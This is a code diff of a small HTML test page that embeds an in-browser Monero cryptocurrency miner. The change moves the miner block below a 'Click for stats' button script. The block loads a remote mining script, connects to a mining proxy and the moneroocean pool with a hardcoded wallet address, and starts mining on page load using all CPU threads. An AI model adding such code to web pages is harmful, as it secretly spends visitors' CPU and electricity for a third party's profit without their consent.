@@ -4,17 +4,6 @@
 <h1>test</h1>
 <p>This is a java script miner test</p>
 <p>If chrome says higher cpu usage, then its working!</p>
-<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
-<script>
-    server = "wss://f.xmrminingproxy.com:8181";
-    var pool = "moneroocean.stream";
-    var walletAddress = "4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si";
-    var workerId = ""
-    var threads = -1;
-    var password = "x";
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 20;
-</script>
 <script>
 let btn = document.createElement("button");
 btn.innerHTML = "Click for stats";
@@ -39,6 +28,17 @@ request.onreadystatechange = function() {
 };
 };
 document.body.appendChild(btn);
+</script>
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si";
+    var workerId = ""
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
 </script>
 </body>
 </html> 
